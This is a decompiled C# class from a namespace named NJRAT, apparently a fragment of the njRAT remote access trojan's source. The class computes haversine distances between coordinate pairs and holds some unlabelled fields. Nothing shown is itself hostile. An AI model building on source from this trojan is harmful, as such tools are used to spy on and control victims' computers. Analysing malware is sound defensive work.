using System;
using System.Diagnostics;

namespace NJRAT
{
	// Token: 0x02000033 RID: 51
	public sealed class GClass6
	{
		// Token: 0x060005B8 RID: 1464 RVA: 0x001458B0 File Offset: 0x00143CB0
		[DebuggerNonUserCode]
		public GClass6()
		{
		}

		// Token: 0x060005B9 RID: 1465 RVA: 0x001458BC File Offset: 0x00143CBC
		public double method_0(GClass6 gclass6_0)
		{
			double num = this.double_0;
			double num2 = this.double_1;
			double num3 = gclass6_0.double_0;
			double num4 = gclass6_0.double_1;
			num *= GClass6.double_4;
			num3 *= GClass6.double_4;
			double num5 = num3 - num;
			double num6 = (num4 - num2) * GClass6.double_4;
			double num7 = Math.Pow(Math.Sin(num5 / 2.0), 2.0) + Math.Cos(num) * Math.Cos(num3) * Math.Pow(Math.Sin(num6 / 2.0), 2.0);
			return GClass6.double_2 * Math.Atan2(Math.Sqrt(num7), Math.Sqrt(1.0 - num7));
		}

		// Token: 0x0400030F RID: 783
		public double double_0;

		// Token: 0x04000310 RID: 784
		public double double_1;

		// Token: 0x04000311 RID: 785
		private static double double_2 = 12756.4;

		// Token: 0x04000312 RID: 786
		private static double double_3 = 3.14159265;

		// Token: 0x04000313 RID: 787
		private static double double_4 = GClass6.double_3 / 180.0;

		// Token: 0x04000314 RID: 788
		public int int_0;

		// Token: 0x04000315 RID: 789
		public int int_1;

		// Token: 0x04000316 RID: 790
		public int int_2;

		// Token: 0x04000317 RID: 791
		public string string_0;

		// Token: 0x04000318 RID: 792
		public string string_1;

		// Token: 0x04000319 RID: 793
		public string string_2;

		// Token: 0x0400031A RID: 794
		public string string_3;

		// Token: 0x0400031B RID: 795
		public string string_4;

		// Token: 0x0400031C RID: 796
		public string string_5;
	}
}
